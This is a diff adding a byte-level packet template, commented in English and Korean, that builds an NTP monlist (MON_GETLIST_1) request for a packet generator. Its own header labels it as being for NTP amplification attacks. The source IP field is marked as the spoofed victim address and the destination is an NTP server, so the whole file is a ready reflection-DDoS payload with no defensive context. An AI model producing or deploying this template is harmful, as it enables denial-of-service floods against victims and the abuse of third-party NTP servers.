@@ -1,0 +1,37 @@
+# NTP Monlist Packet Template
+# L4 NTP Amplification 공격용
+
+# L2 :: Ethernet HEADER
+@DMAC:6  # dst MAC
+@SMAC:6  # src MAC
+08 00    # Type: IP
+
+# L3 :: IP Header
+45       # Version: 4, Header Length: 20
+00       # Differentiated Service Field: 0
+00 4c    # Total Length: 76
+KK GG    # Identification (Random)
+40 00    # Flags: Don't Fragment
+40       # Time To Live: 64
+11       # Protocol: UDP
+@IPCHK:2 # Header Checksum
+@SIP:4   # Source IP (Spoofed - Victim)
+@DIP:4   # Destination IP (NTP Server)
+
+# L4 :: UDP Header
+GK GG    # Source Port (Random)
+00 7b    # Destination Port: 123 (NTP)
+00 38    # UDP Length: 56
+@UDPCHK:2 # UDP Checksum
+
+# NTP Private Mode (MON_GETLIST_1)
+17       # LI=0, VN=2, Mode=7 (Private)
+00       # Response bit=0, More=0, Sequence=0
+03       # Implementation: 3
+2a       # Request Code: 42 (MON_GETLIST_1)
+00 00    # Error/Number of data items
+00 00    # MBZ/Size of data item
+00 00 00 00 00 00 00 00  # Data (empty for request)
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
